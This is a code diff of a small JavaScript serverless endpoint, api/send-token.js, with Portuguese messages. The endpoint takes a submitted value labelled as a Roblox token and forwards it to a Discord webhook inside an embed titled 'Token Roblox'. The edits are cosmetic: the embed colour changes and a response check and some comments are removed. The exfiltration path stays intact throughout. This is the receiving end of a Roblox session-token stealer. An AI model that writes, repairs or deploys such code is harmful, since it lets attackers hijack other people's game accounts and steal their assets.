@@ -1,6 +1,4 @@
-// api/send-token.js
 export default async function handler(req, res) {
-  // Só aceita POST
   if (req.method !== 'POST') {
     return res.status(405).json({ error: 'Método não permitido' });
   }
@@ -18,25 +16,21 @@ export default async function handler(req, res) {
     embeds: [{
       title: "Token Roblox",
       description: "```" + token + "```",
-      color: 0xff0044,
+      color: 0x888888,
       footer: { text: new Date().toLocaleString("pt-BR") }
     }]
   };
 
   try {
-    const response = await fetch(webhook, {
+    await fetch(webhook, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(payload)
     });
 
-    if (!response.ok) {
-      throw new Error("Falha ao enviar pro Discord");
-    }
-
-    return res.status(200).json({ success: true });
+    res.status(200).json({ success: true });
   } catch (error) {
     console.error(error);
-    return res.status(500).json({ error: "Erro interno" });
+    res.status(500).json({ error: "Erro interno" });
   }
 }
